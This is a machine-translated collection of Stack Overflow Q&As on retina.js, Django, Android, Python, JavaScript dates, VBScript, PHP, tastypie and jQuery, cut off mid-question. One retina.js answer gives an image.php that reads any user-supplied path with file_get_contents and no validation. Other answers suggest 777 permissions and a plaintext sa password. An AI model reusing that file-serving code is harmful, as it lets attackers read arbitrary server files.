*   Persist '2x' 路径验证结果`localStorage`：在初始化期间，retina.js 可以检查`localStorage`结果缓存。如果找到，则可以绕过对已经遇到的“2x”图像的验证过程，并且可以下载或跳过“2x”图像。可以验证新遇到的“2x”图像路径并将结果添加到缓存中。理论上，虽然`localStorage`可用，但对于每个浏览器的图像，404 只会出现一次。这将适用于域上任何页面的页面。

这是一个快速检查。可能需要添加过期功能。

[https://gist.github.com/4343101/revisions](https://gist.github.com/4343101/revisions)

### 使用 HTTP 重定向标头

我必须指出，我对“服务器端”问题的理解充其量是*参差不齐的。*请收下这个 FWIW

另一种选择是让服务器使用重定向代码响应具有`@2x`字符但不存在的图像请求。请参阅[此相关答案](https://stackoverflow.com/a/3778511/1888292)。

尤其：

> 如果您重定向图像并且它们是可缓存的，那么理想情况下，您会为遥远的将来的某个日期设置一个 HTTP Expires 标头（以及相应的 Cache-Control 标头），因此至少在用户后续访问该页面时不会有再次通过重定向。

使用重定向响应将摆脱 404 并导致浏览器跳过后续尝试访问不存在的“2x”图像路径。

### 可以使retina.js 更具选择性

可以修改retinajs 以排除某些图像。

与此相关的拉取请求：[https ://github.com/imulus/retinajs/commit/e7930be](https://github.com/imulus/retinajs/commit/e7930be)

根据拉取请求，`<img>`可以使用 CSS 选择器，而不是按标签名称查找元素，这可以是 Retina.js 的可配置选项之一。可以创建一个 CSS 选择器来过滤掉用户上传的图像（以及其他预期不存在“2x”变体的图像）。

另一种可能性是将过滤器功能添加到可配置选项中。可以在每个匹配的`<img>`元素上调用该函数；a`return true`将导致下载“2x”变体，其他任何内容都会导致`<img>`跳过。

基本的默认配置将从[当前版本](https://github.com/imulus/retinajs/blob/5671145d8a8adf3d72b6b62d8927799f8dd97863/src/retina.js#L5)更改为：

```
var config = {
  check_mime_type: true,
  retinaImgTagSelector: 'img',
  retinaImgFilterFunc: undefined
}; 
```

该`Retina.init()`功能将从[当前版本](https://github.com/imulus/retinajs/blob/5671145d8a8adf3d72b6b62d8927799f8dd97863/src/retina.js#L22)更改为：

```
Retina.init = function(context) {
  if (context == null) context = root;

  var existing_onload = context.onload || new Function;

  context.onload = function() {
    // uses new query selector
    var images = document.querySelectorAll(config.retinaImgTagSelector), 
        retinaImages = [], i, image, filter;

    // if there is a filter, check each image
    if (typeof config.retinaImgFilterFunc === 'function') {
      filter = config.retinaImgFilterFunc;
      for (i = 0; i < images.length; i++) {
        image = images[i];
        if (filter(image)) {
          retinaImages.push(new RetinaImage(image));
        }
      }
    } else {
      for (i = 0; i < images.length; i++) {
        image = images[i];
        retinaImages.push(new RetinaImage(image));
      }
    }
    existing_onload();
  }
}; 
```

为了将其付诸实践，在`window.onload`火灾之前，请致电：

```
window.Retina.configure({

  // use a class 'no-retina' to prevent retinajs
  // from checking for a retina version
  retinaImgTagSelector : 'img:not(.no-retina)',

  // or, assuming there is a data-owner attribute
  // which indicates the user that uploaded the image:
  // retinaImgTagSelector : 'img:not([data-owner])',

  // or set a filter function that will exclude images that have
  // the current user's id in their path, (assuming there is a
  // variable userId in the global scope)
  retinaImgFilterFunc: function(img) {
    return img.src.indexOf(window.userId) < 0;
  }
}); 
```

更新：清理和重组。添加了`localStorage`增强功能。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-12-14T17:26:57.830

**简短回答：仅使用客户端 JavaScript 是不可能的**

在浏览了代码并进行了一些研究之后，在我看来，retina.js 并没有**真正**抛出 404 错误。

Retina.js 实际上在做的是请求一个文件并根据错误代码简单地检查它是否存在。这实际上意味着它**要求浏览器检查文件是否存在。**浏览器是为您提供 404 的原因，并且没有跨浏览器方法可以防止这种情况（我说“跨浏览器”，因为我只检查了 webkit）。

但是，如果这确实是一个问题，您可以做的是在服务器端做一些事情来完全防止 404。

本质上，这将是，例如，/retina.php ?image= **YOUR_URLENCODED_IMAGE_PATH**一个请求，当视网膜图像存在时可以返回这个请求......

```
{"isRetina": true, "path": "YOUR_RETINA_IMAGE_PATH"}} 
```

如果它不...

```
{"isRetina": false, "path": "YOUR_REGULAR_IMAGE_PATH"}} 
```

然后，您可以让一些 JavaScript 调用此脚本并根据需要解析响应。**我并不是说这是唯一或最好的解决方案，只是一个可行的解决方案。**

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2015-05-05T01:36:23.373

Retina JS 支持图像标签上的属性 data-no-retina。这样它就不会试图找到视网膜图像。

对于寻求简单解决方案的其他人很有帮助。

```
<img src="/path/to/image" data-no-retina /> 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-11-25T20:57:24.643

我更喜欢对替换哪些图像进行更多控制。

对于我创建了@2x 的所有图像，我将原始图像名称更改为包含@1x。（* 请参见下面的注释。）我稍微更改了retina.js，使其仅查看 [name]@1x.[ext] 图像。

我在retina-1.1.0.js 中替换了以下行：

```
retinaImages.push(new RetinaImage(image)); 
```

使用以下几行：

```
 if(image.src.match(/@1x\.\w{3}$/)) {
    image.src = image.src.replace(/@1x(\.\w{3})$/,"$1");
    retinaImages.push(new RetinaImage(image));
} 
```

这使得retina.js 只用@2x 命名图像替换@1x 命名图像。

(* 注意：在探索这一点时，似乎 Safari 和 Chrome 会自动将 @1x 图像替换为 @2x 图像，即使没有安装retina.js。我懒得追踪这个，但我想这是一个功能最新的 webkit 浏览器。实际上，retina.js 和对它的上述更改对于跨浏览器支持是必要的。）

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-12-19T10:07:44.167

一种解决方案是使用 PHP：

将第一篇文章中的代码替换为：

```
 http = new XMLHttpRequest;
        http.open('HEAD', "/image.php?p="+this.at_2x_path);
        http.onreadystatechange = function() {
            if (http.readyState != 4) {
                return callback(false);
            }

            if (http.status >= 200 && http.status <= 399) {
                if (config.check_mime_type) {
                    var type = http.getResponseHeader('Content-Type');
                    if (type == null || !type.match(/^image/i)) {
                        return callback(false);
                    }
                }

                RetinaImagePath.confirmed_paths.push(that.at_2x_path);
                return callback(true);
            } else {
                return callback(false);
            }
        }
        http.send(); 
```

并在您的站点根目录中添加名为“image.php”的文件：

```
<?php
 if(file_exists($_GET['p'])){
  $ext = explode('.', $_GET['p']);
  $ext = end($ext);
  if($ext=="jpg") $ext="jpeg";
  header("Content-Type: image/".$ext);
  echo file_get_contents($_GET['p']);
 }
?> 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-18T15:24:26.313

Retina.js 是一个用于在静态网页上固定图像的好工具，但如果您要检索用户上传的图像，那么正确的工具是服务器端。我在这里想象 PHP，但相同的逻辑可以应用于任何服务器端语言。

*假设上传图片的一个很好的安全习惯是不要让用户通过直接 url 访问它们：如果用户成功将恶意脚本上传到您的服务器，他应该无法通过 url ( `www.yoursite.com/uploaded/mymaliciousscript.php`) 启动它。因此，`<img src="get_image.php?id=123456" />`如果可以的话，通过一些脚本检索上传的图像通常是一个好习惯......（更好的是，将上传文件夹放在文档根目录之外）*

现在 get_image.php 脚本可以根据某些条件获取适当的图像 123456.jpg 或 123456@2x.jpg。

[http://retina-images.complexcompulsions.com/#setupserver](http://retina-images.complexcompulsions.com/#setupserver)的方法似乎非常适合您的情况。

首先，通过 JS 或 CSS 加载文件，在标题中设置 cookie：

头部内部：

```
<script>(function(w){var dpr=((w.devicePixelRatio===undefined)?1:w.devicePixelRatio);if(!!w.navigator.standalone){var r=new XMLHttpRequest();r.open('GET','/retinaimages.php?devicePixelRatio='+dpr,false);r.send()}else{document.cookie='devicePixelRatio='+dpr+'; path=/'}})(window)</script> 
```

在身体的开头：

```
<noscript><style id="devicePixelRatio" media="only screen and (-moz-min-device-pixel-ratio: 2), only screen and (-o-min-device-pixel-ratio: 2/1), only screen and (-webkit-min-device-pixel-ratio: 2), only screen and (min-device-pixel-ratio: 2)">#devicePixelRatio{background-image:url("/retinaimages.php?devicePixelRatio=2")}</style></noscript> 
```

现在，每次调用您检索上传图像的脚本时，它都会有一个 cookie 集询问是否需要视网膜图像。

当然，您可以使用提供的retinaimages.php 脚本来输出图像，但您也可以根据您从数据库中生成和检索图像的方式或对用户隐藏上传目录的方式来修改它以适应您的需要。

因此，它不仅可以加载适当的图像，而且如果安装了 GD2，并且您将原始上传的图像保留在服务器上，它甚至可以调整它的大小并相应地裁剪并将 2 个缓存的图像大小保存在服务器上。在retinaimages.php 源代码中，您可以看到（并复制）它是如何工作的：

```
<?php
    $source_file = ...
    $retina_file = ....

    if (isset($_COOKIE['devicePixelRatio'])) {
        $cookie_value = intval($_COOKIE['devicePixelRatio']);
    }
    if ($cookie_value !== false && $cookie_value > 1) {
        // Check if retina image exists
        if (file_exists($retina_file)) {
            $source_file = $retina_file;
        }
    }
    ....

    header('Content-Length: '.filesize($source_file), true);
    readfile($source_file); // or read from db, or create right size.. etc..

?> 
```

优点：图像只加载一次（3G 上的视网膜用户至少不会加载 1x+2x 图像），如果启用了 cookie，即使**没有 JS**也可以工作，可以轻松打开和关闭，无需使用苹果命名约定。您加载图像 12345 并为您的设备获得正确的 DPI。

通过 url 重写，您甚至可以通过将 /get_image/1234.jpg 重定向到 /get_image.php?id=1234.jpg 来使其完全透明

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-10-03T18:49:31.800

我的建议是您将 404 错误识别为真正的错误，并按照您应该的方式修复它们，即提供 Retina 图形。您使您的脚本与 Retina 兼容，但您并没有通过使您的图形工作流程与 Retina 兼容来完成循环。因此，实际上缺少 Retina 图形。无论您的图形工作流程开始时出现什么，工作流程的输出都必须是 2 个图像文件，一个低分辨率和 Retina 2x。

如果用户上传了一张 3000x2400 的照片，你应该认为这是照片的 Retina 版本，将其标记为 2x，然后使用服务器端脚本生成更小的 1500x1200 非 Retina 版本，没有 2x。这两个文件一起构成一个 1500x1200 Retina 兼容图像，无论显示器是否为 Retina，都可以在 1500x1200 的 Web 环境中显示。您不必关心，因为您拥有与 Retina 兼容的图像和与 Retina 兼容的网站。RetinaJS 脚本是唯一需要关心客户端是否使用 Retina 的脚本。因此，如果您正在从用户那里收集照片，除非您生成 2 个文件（低分辨率和高分辨率），否则您的任务是不完整的。

典型的智能手机拍摄的照片大小超过智能手机显示屏的 10 倍。所以你应该总是有足够的像素。但是如果你得到非常小的图像，比如 500px，那么你可以在你的服务器端图像减少脚本中设置一个断点，这样在下面，上传的照片将用于低分辨率版本，脚本会生成 2x 副本这不会比非 Retina 图像更好，但它将与 Retina 兼容。

使用此解决方案，您的整个问题是“是否存在 2x 图像？” 消失，因为它一直都在。兼容 Retina 的网站将愉快地使用您的 Retina 兼容照片数据库，没有任何投诉。

# django - django上传文件没有模型

> ID：13704320
> 
> 赞同：4
> 
> 时间：2012-12-04T13:42:42.043
> 
> 标签：django, file, upload

是否可以使用表单中的 FileField 但没有模型在 django 中上传文件？到目前为止，我只能找到带有模型的示例。我不想在我的数据库中为此创建一个表，我只想上传一个文件。我的表格：

```
class csvUploadForm(forms.Form):
    csvFile = forms.FileField(label='Select a CSV file to upload.', help_text='help') 
```

谢谢，

罗曼

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-06-01T17:42:42.497

示例转载自[Django 文档](https://docs.djangoproject.com/en/1.4/topics/http/file-uploads/)。

```
from django.http import HttpResponseRedirect
from django.shortcuts import render_to_response

def upload_file(request):
    if request.method == 'POST':
        form = UploadFileForm(request.POST, request.FILES)
        if form.is_valid():
            handle_uploaded_file(request.FILES['file'])
            return HttpResponseRedirect('/success/url/')
    else:
        form = UploadFileForm()
    return render_to_response('upload.html', {'form': form})

def handle_uploaded_file(f):
    destination = open('some/file/name.txt', 'wb+')
    for chunk in f.chunks():
        destination.write(chunk)
    destination.close() 
```

您可以将“some/file/name.txt”替换为要存储该文件的其他路径。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:52:48.133

这在 Django 文档的[文件上传](https://docs.djangoproject.com/en/dev/topics/http/file-uploads/)部分中有介绍。简而言之，使用 中`UploadedFile`给出的实例`request.FILES`。

# android - Android：两个edittext可变，第二个错误

> ID：13704325
> 
> 赞同：-4
> 
> 时间：2012-12-04T13:42:53.273
> 
> 标签：android, android-edittext, onchange

我有这个代码：

```
 final EditText kcalh=(EditText) findViewById(R.id.kcalh_inserisci);
    final EditText kw=(EditText) findViewById(R.id.kw_inserisci);
    kcalh.addTextChangedListener(new TextWatcher() {
        public void onTextChanged(CharSequence s, int start, int before, int count) {}
        public void afterTextChanged(Editable arg0) {
            int risultato=Integer.parseInt(kcalh.getText().toString())/860;
            kw.setText(""+risultato);
        }
        public void beforeTextChanged(CharSequence arg0, int arg1,int arg2, int arg3) {}
     });
    kw.addTextChangedListener(new TextWatcher() {
        public void onTextChanged(CharSequence s, int start, int before, int count) {}
        public void afterTextChanged(Editable arg0) {
            int risultato=Integer.parseInt(kw.getText().toString())*860;
            kcalh.setText(""+risultato);
            System.out.println(risultato);
        }
        public void beforeTextChanged(CharSequence arg0, int arg1,int arg2, int arg3) {}
     }); 
```

当我更改第一个edittext时，一切正常（第二个edittext改变了它的值......当我使用第二个时，应用程序崩溃了。你知道为什么吗？我认为它进入了第一个和崩溃的后文本......但是为什么不中二也？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:52:10.683

在将 String 解析为 Integer 之前检查 EditText 是否为空：

```
kw.addTextChangedListener(new TextWatcher() {
        public void onTextChanged(CharSequence s, int start, int before, int count) {}
        public void afterTextChanged(Editable arg0) {
            if(kw.getText().toString().length() > 0){
              int risultato=Integer.parseInt(kw.getText().toString())*860;
               kcalh.setText(""+risultato);
               System.out.println(""+risultato);
           }
        }
        public void beforeTextChanged(CharSequence arg0, int arg1,int arg2, int arg3) {}
     }); 
```

# python - python docstring打印机问题

> ID：13704326
> 
> 赞同：2
> 
> 时间：2012-12-04T13:42:54.770
> 
> 标签：python, docstring

我正在努力通过 Zed Shaw 的 LPTHW，我在（新）练习 43 额外学分 3 中​​遇到了障碍。

所以在这里我试图创建一个函数，打印另一个函数，它是一个大的文档字符串。

这里是引擎

```
class Game(object):

    def __init__(self, start):
        self.quips = [
            "You died.  You kinda suck at this.",
            "Your mom would be proud. If she were smarter.",
            "Such a luser.",
            "I have a small puppy that's better at this."
        ]
        self.start = start

    def play(self):
        # next_room_name is taken from init argument start
        next_room_name = self.start

        while True:
            print "\n--------"
            # set variable room to get function from next_room_name
            room = getattr(self, next_room_name)
            # unpacks function from next_room_name into room
            next_room_name = room()

            room = current_room
            print current_room.__doc__ 
```

这是我试图调用来启动游戏的一些函数。

```
 def central_corridor(self):
        """
The Gothons of Planet Percal #25 have invaded your ship and destroyed
your entire crew.  You are the last surviving member and your last
mission is to get the neutron destruct bomb from the Weapons Armory,
put it in the bridge, and blow the ship up after getting into an 
escape pod. 

You're running down the central corridor to the Weapons Armory when
a Gothon jumps out, red scaly skin, dark grimy teeth, and evil clown costume
flowing around his hate filled body.  He's blocking the door to the
Armory and about to pull a weapon to blast you.
        """

        action = raw_input("> ")

        if action == "shoot!":
            print "Quick on the draw you yank out your blaster and fire it at the Gothon."
            print "His clown costume is flowing and moving around his body, which throws"
            print "off your aim.  Your laser hits his costume but misses him entirely.  This"
            print "completely ruins his brand new costume his mother bought him, which"
            print "makes him fly into an insane rage and blast you repeatedly in the face until"
            print "you are dead.  Then he eats you."
            return 'death'

        elif action == "dodge!":
            print "Like a world class boxer you dodge, weave, slip and slide right"
            print "as the Gothon's blaster cranks a laser past your head."
            print "In the middle of your artful dodge your foot slips and you"
            print "bang your head on the metal wall and pass out."
            print "You wake up shortly after only to die as the Gothon stomps on"
            print "your head and eats you."
            return 'death'

        elif action == "tell a joke":
            print "Lucky for you they made you learn Gothon insults in the academy."
            print "You tell the one Gothon joke you know:"
            print "Lbhe zbgure vf fb sng, jura fur fvgf nebhaq gur ubhfr, fur fvgf nebhaq gur ubhfr."
            print "The Gothon stops, tries not to laugh, then busts out laughing and can't move."
            print "While he's laughing you run up and shoot him square in the head"
            print "putting him down, then jump through the Weapon Armory door."
            return 'laser_weapon_armory'

        else:
            print "DOES NOT COMPUTE!"
            return 'central_corridor' 
```

这是它在主程序中的调用方式

```
a_game = Game("central_corridor")
a_game.play() 
```

但我得到的只是

```
--------
> 
```

编辑：为了成功完成练习，我需要编辑引擎以打印出文档字符串，而不是编辑函数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:48:27.487

你现在拥有它的方式`current_room`永远不会改变，所以它总是会打印任何初始值的文档字符串`current_room`，如果有的话。

看来你根本不需要`current_room`。您可以删除该行`room = current_room`并只写：

```
print room.__doc__ 
```

**编辑**：我查看了[实际练习](http://learnpythonthehardway.org/book/ex43.html)，显然`central_corridor`比您在问题中显示的要多 - 它要求用户输入。由于您希望在用户输入之前显示文档字符串，因此您应该在调用*之前*`room()`打印文档字符串。

# javascript - 2012/10/20 无法提前一天

> ID：13704328
> 
> 赞同：1
> 
> 时间：2012-12-04T13:43:05.890
> 
> 标签：javascript, date, dst, date-arithmetic

尝试这个：

```
date = new Date(2012,9,20)
Sat Oct 20 2012 00:00:00 GMT-0300 (BRT)
new Date(date.getFullYear(), date.getMonth(), date.getDate()+1)
Sat Oct 20 2012 23:00:00 GMT-0300 (BRT) 
```

（在 Chrome 和 Firebug 上测试）

但这有效：

```
date = new Date(2012,10,20)
Sat Nov 20 2012 00:00:00 GMT-0300 (BRT)
new Date(date.getFullYear(), date.getMonth(), date.getDate()+1)
Sat Nov 21 2012 0:00:00 GMT-0300 (BRT) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T13:52:45.733

问题是巴西从 10 月 20 日开始实行夏令时 ( [BRT](http://www.timeanddate.com/worldclock/timezone.html?n=233) )。尝试使用 UTC 时间：

```
date= new Date(Date.UTC(2012,9,20)); // zero-based month: 9->october
new Date(Date.UTC(date.getUTCFullYear(), date.getUTCMonth(), date.getUTCDate()+1)) 
```

这应该使您的日期提前独立于夏令时，让您的过渡顺利进行。有关更多信息，请参阅[Javascript 日期：处理夏令时的最佳方法是什么？](https://stackoverflow.com/q/4110039/544198)

或者，您可以将日期的时间设置为一天中的某个时间，例如中午，如果您真正关心的是这一天。

```
date = new Date(2012,9,20,12)
new Date(date.getFullYear(), date.getMonth(), date.getDate()+1) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:51:28.380

这是夏令时：此时在 GMT-0300 时间倒退 1 小时。您的示例在 GMT+0400 时区运行良好。

请参阅问题[1º Day of Daylight Saving Time Java 和 JS 显示不同的行为](https://stackoverflow.com/questions/13048281/1-day-of-daylight-saving-time-java-and-js-showing-a-different-behavior)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:48:11.623

它工作得很好：

```
console.log(date = new Date(2012,9,20))
console.log(new Date(date.getFullYear(), date.getMonth(), date.getDate()+1))
// returns:
// Sat Oct 20 2012 00:00:00 GMT+0200 (West-Europa (zomertijd))
// Sun Oct 21 2012 00:00:00 GMT+0200 (West-Europa (zomertijd)) 
```

^(（不要介意末尾的本地化字符串）)

显然，您刚刚在本地化中开始了夏令时。请尝试`Date.UTC()`，除非您特别需要时间进行本地化。

# sql - 将值从 SQL 语句保存到 VBS 变量

> ID：13704336
> 
> 赞同：-1
> 
> 时间：2012-12-04T13:43:48.493
> 
> 标签：sql, vbscript

作为 SQL 和 VBS 编程的初学者，我遇到了以下问题。我想确定 SQL 表中的行数，将该值保存到 VBS 变量，然后在 for 循环中使用它。我想出了以下代码，但很明显我在这里遗漏了一些东西，我基本上被卡住了。

```
num_rows = "SELECT COUNT(id) FROM recepti_sol"

For y = 0 To "num_rows" 
```

请帮我完成代码。感谢您的时间和努力！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:48:46.020

**编辑** 这是 sql server 的示例 将
其视为最简单的运行，但由于它具有明文密码，因此不能使其高效。无论如何它可能会失败，具体取决于您的 sqlserver 配置，但您可以使用不同的连接字符串进行修复，因此，再次阅读它们

```
set conn= CreateObject("ADODB.Connection")
conn.Open "Driver={SQLServer};Server=Your_Server_Name;Database=Your_Database_Name;Uid=sa;Pwd=saPassword;"
set rs = CreateObject("ADODB.recordset")
rs.Open "SELECT COUNT(id) as num_rows FROM recepti_sol", conn
For y = 1 To rs("num_rows")
  ...
  ...
next
rs.close
conn.close
set rs = nothing
set conn = nothing 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:50:33.027

请参阅[我对您的其他问题的回答](https://stackoverflow.com/a/13688782/603855)- 使用 Recordset 对象的 .GetRows() 方法并使用返回的二维数组。

# php - 我无法删除服务器上的目录

> ID：13704337
> 
> 赞同：0
> 
> 时间：2012-12-04T13:43:50.647
> 
> 标签：php, permissions, filesystems

不小心我在远程服务器上创建了该文件夹，因为`mkdir("folder_name",0);`现在我无法从服务器中删除该文件夹。我认为这是来自许可，因为`0`不是正确的许可。

那么，现在如何从服务器中删除此文件夹？

PS 我使用 aptana sudio 作为 FTP 客户端

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:46:29.883

首先尝试将权限更改为合适的 777 并再次尝试将其删除

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:46:46.620

在您的服务器中，您可以使用[chmod](http://fr2.php.net/manual/en/function.chmod.php)更改权限并使用[rmdir](http://fr2.php.net/manual/en/function.rmdir.php)删除目录：

```
chmod("folder_name", 0777);
rmdir("folder_name"); 
```

# javascript - 本地 CSS 和 JS 文件未链接到 html 页面

> ID：13704338
> 
> 赞同：1
> 
> 时间：2012-12-04T13:44:01.243
> 
> 标签：javascript, html, css, hyperlink, tornado

我有一个基本的 html 文件，我希望所有其他页面都从中继承某些特性。但是虽然我继承的页面例如。`main.html`可以参考外部链接，例如：

```
<link href="http://twitter.github.com/bootstrap/1.4.0/bootstrap.css" rel="stylesheet"> 
```

没有问题。但是，当我尝试下载 twitter 引导程序并将文件存储在与所有其他 html 页面相同的目录中时，它无法链接到该文件，并且它给了我一个 404 错误。我的文件结构很简单；一个名为 templates 的文件夹，其中包含该目录中的所有 html、css 和 js 文件。

所以我这样做：

```
 <link href="bootstrap.css" rel="stylesheet" media="screen"> 
```

当我尝试这样做时：

```
<link href="http://localhost/templates/bootstrap.css" rel="stylesheet" media="screen"> 
```

我没有收到任何`404`错误，但是从网页上的查看源代码中，如果我尝试访问该页面，我会收到一条错误消息：

> Firefox 无法与位于 的服务器建立连接。

我真的很困惑为什么这个“简单”的事情不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:49:22.310

你的html里面有`base`标签吗？如果是这样，它可能会说 Firefox 一个特定的主机在哪里可以找到文件，而不是 localhost。尝试在 Firefox 或 Chrome 开发者工具上使用 Firebug 来查看它试图检索的 URL。

# python - 美味派 - 在哪里限制可能由 PATCH 更新的字段？

> ID：13704344
> 
> 赞同：3
> 
> 时间：2012-12-04T13:44:18.020
> 
> 标签：python, django, patch, tastypie

我有一个有效的 GET /tastepie（只读）解决方案。

我已允许 PUT/PATCH 请求并成功修补记录。

但是，对于（已经）经过身份验证和授权的用户，我想将 PATCH 功能限制为仅在适当的模型资源上的某些字段。我仍然希望用户能够获取（查看）所有字段。

实现这种限制的最佳位置（方法？）在哪里？

文档： [https ://django-tastypie.readthedocs.org/en/latest/interacting.html?highlight=patch#partially-updating-an-existing-resource-patch](https://django-tastypie.readthedocs.org/en/latest/interacting.html?highlight=patch#partially-updating-an-existing-resource-patch)

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-06-14T15:24:18.727

有点晚了，但也许这会对某人有所帮助。

我的解决方案是覆盖`update_in_place`并检查传递的数据。

```
from tastypie.resources import ModelResource
from tastypie.exceptions import BadRequest

class MyResource(ModelResource):
    class Meta:
        ...
        allowed_update_fields = ['field1', 'field2']

    def update_in_place(self, request, original_bundle, new_data):
        if set(new_data.keys()) - set(self._meta.allowed_update_fields):
            raise BadRequest(
                'Only update on %s allowed' % ', '.join(
                    self._meta.allowed_update_fields
                )
            )

        return super(MyResource, self).update_in_place(
            request, original_bundle, new_data
        ) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:18:51.197

由于您似乎已经为用户授权，您应该能够通过添加到 ModelResource 中的 Meta 类来实现这一点。例如，使用 DjangoAuthorization （[来自tastepie docs](https://django-tastypie.readthedocs.org/en/latest/authentication_authorization.html#usage)）：

```
from tastypie.authentication import BasicAuthentication
from tastypie.authorization import DjangoAuthorization
...

class SomeResource(ModelResource):
  ...
  class Meta:
    ...
    authentication = BasicAuthentication()
    authorization = DjangoAuthorization() 
```

此示例将为您提供用户授权，以执行 中定义的操作`django.contrib.auth.models.Permission`。

我也从美味的谷歌集团那里得到了[这个。](https://groups.google.com/forum/?fromgroups=#!topic/django-tastypie/ap19e7MZRtY)它采用[脱水法](http://django-tastypie.readthedocs.org/en/latest/resources.html#the-dehydrate-cycle)。以下是 Google Groups 链接中提供的示例：

```
def dehydrate(self, bundle): 
 bundle = super(self, MyResource).dehydrate(bundle) 

 # exclude the restricted field for users w/o the permission foo 
 if not bundle.request.user.has_perm('app.foo'): 
     del bundle.data['restricted'] 

 return bundle 
```

# android - 检查图像是否为黑色

> ID：13704350
> 
> 赞同：3
> 
> 时间：2012-12-04T13:45:00.147
> 
> 标签：android, python, image-processing, monkeyrunner

我在 Windows 下运行一个 Python 脚本，它处理`PNG`32 位深度的 480x800 图像。我需要检查给定的图像是否全黑。经过一番搜索，我发现 ImageMagick 可以帮助我实现这一目标，但不幸的是，没有此类任务的手册。

所以一个更普遍的问题是如何检查图像是否只包含一种颜色？

**编辑：**

对于没有从一开始就提供有关环境的所有信息，我深表歉意。python 脚本使用 Android 的[`monkeyrunner`](http://developer.android.com/tools/help/monkeyrunner_concepts.html). 由于它使用自己的 Jython 实例（2.5 版），因此无法使用来自外部库的任何模块。里面有一个`MonkeyImage`类可以处理从设备截取的屏幕截图。所以我采用了@eumiro 的回答。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:52:49.620

```
import Image
im = Image.load("image.png")
diff_colors = list(set(im.getdata()))
if len(diff_colors) == 1 and diff_colors[0] == (0, 0, 0):
    print "all black" 
```

**正如@JonClements 建议的那样进行编辑**，一旦发现黑色以外的任何东西，这将更快并停止：

```
import Image
im = Image.load("image.png")
if all(rgb == (0,0,0) for rgb in im.getdata()):
    print "all black" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:52:21.987

我不是 Python 专家，但我看到有一个可以使用的 PNG 模块。加载 PNG 并将其导出到 RGB(A) 数组。

检查它是否完全是黑色的应该很简单。遍历数组并确保没有与 0 不同。

我认为这应该有效。

出于好奇，您为什么要检查图像是否为黑色？

# javascript - jQuery 的 $. 参考？

> ID：13704356
> 
> 赞同：3
> 
> 时间：2012-12-04T13:45:19.467
> 
> 标签：javascript, jquery, ajax, json, dom

我见过美元。用过，但我一直不明白它代表什么。让我思考的例子：

```
$.getJSON("url", function(result){
                    $.each(result, function(i, field){
                        $(".test").append(field + " ");
                    }); 
```

编辑：对，我很尴尬。我知道它指的是 jQuery，但我只使用 jQuery 进行 DOM 操作，我已经习惯了要处理的元素，它有点措手不及。感谢您提供信息丰富的回复。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-04T13:47:04.343

$ 是 jQuery 的别名 - 请参阅库的最顶部的代码。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-04T13:48:49.990

最简单的情况 -`$`并且`jQuery`是分配给不同变量的相同事物。

`$`是主要`jQuery`对象，它实际上是一个您可以调用的函数，因此可以执行

```
$(selector) 
```

但是，JavaScript 中的函数本身就是对象，因此您可以将方法附加到它们并稍后调用它们。所以`$.each`实际上是`$`对象上的一个方法。

基本上`$.`jQuery没有什么特别之处，只是简单的方法调用。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-12-04T13:46:45.653

它是 jQuery 对象本身的别名，因此不必编写：

```
jQuery.getJSON("url", function(result){
                    jQuery.each(result, function(i, field){
                        jQuery(".test").append(field + " ");
                    }); 
```

您可以编写更方便的代码（如您发布的那样）

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-12-04T13:48:03.720

根据[JQuery 文档](http://docs.jquery.com/Using_jQuery_with_Other_Libraries#General)：

> 默认情况下，jQuery 使用“$”作为“jQuery”的快捷方式

就像你的全名是“Meghananth Rahtod”，人们叫你 Megh。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-12-04T14:09:52.883

它是 jQuery 的别名。$ 是 jQuery 的一个函数，但是当你使用`$("")`, `$(null`)`$(undefined)`或`$(false)`时，jQuery 返回 "this"，调用它自己。在 jQuery 文件（开发，版本 1.8.3）的第 100 行中，您可以看到这一点。

其他调用 jQuery 的方法`window.jQuery`：`window.$`或`jQuery`.

你也可以在这里看到更多：[http ://www.hackification.com/2008/11/27/a-developers-introduction-to-jquery/](http://www.hackification.com/2008/11/27/a-developers-introduction-to-jquery/)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-04T13:49:25.927

只是`jQuery`对象的别名。两者都`$`做`jQuery`同样的事情。

这是 jQuery 源代码的一部分：

```
// Expose jQuery to the global object
window.jQuery = window.$ = jQuery; 
```

您可以在此处访问：[http](http://code.jquery.com/jquery-1.8.3.js)
://code.jquery.com/jquery-1.8.3.js jQuery 是**开源的**。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-12-04T13:49:34.810

它可能会令人困惑，但它`$`是 Javascript 中的有效标识符。

# oracle - 由于数据错误，从游标插入失败，如何找到有问题的数据？

> ID：13704359
> 
> 赞同：0
> 
> 时间：2012-12-04T13:45:25.500
> 
> 标签：oracle, insert, runtime-error

我有正在选择数据的光标，它运行得很好

```
CURSOR Crs_c1 IS
SELECT a.GLOBAL_ACCOUNT_CODE,
       a.LOCAL_ACCOUNT_CODE,
